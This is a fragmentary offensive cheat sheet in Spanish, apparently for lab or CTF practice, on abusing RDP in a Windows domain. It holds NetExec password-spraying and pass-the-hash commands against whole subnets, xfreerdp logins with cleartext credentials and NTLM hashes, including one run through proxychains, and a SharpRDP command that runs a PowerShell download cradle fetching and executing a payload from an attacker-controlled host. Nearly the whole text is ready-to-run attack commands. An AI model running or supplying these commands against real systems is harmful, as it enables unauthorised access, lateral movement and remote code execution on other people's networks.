...
netexec rdp 10.129.229.0/24 -u helen -p 'Password123!' -d domain.local

# Password spray con lista de usuarios
netexec rdp 172.20.0.0/24 -u users.txt -p 'Password123' -d domain.local

# Pass the Hash via RDP con NetExec
netexec rdp 172.20.0.0/24 -u helen -H 62EBA30320E250ECA185AA1327E78AEB -d domain.local
```
...
```c
xfreerdp /u:Helen /p:'Password123!' /d:domain.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
```
...
```c
xfreerdp /u:Helen /p:'Password123!' /d:domain.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```
...
```c
# Sin proxy
xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:domain.local /v:172.20.0.52
...
.\SharpRDP.exe computername=srv01 command="whoami" username=domain\helen password=Password123!

# Ejecutar payload via PowerShell
.\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=domain\helen password=Password123!
```
...
proxychains4 -q xfreerdp /u:helen /pth:<hash> /d:domain.local /v:172.20.0.52
```
...
# Via NetExec
netexec smb 172.20.0.52 -u helen -p 'Password123!' --local-groups "Remote Desktop Users"
```
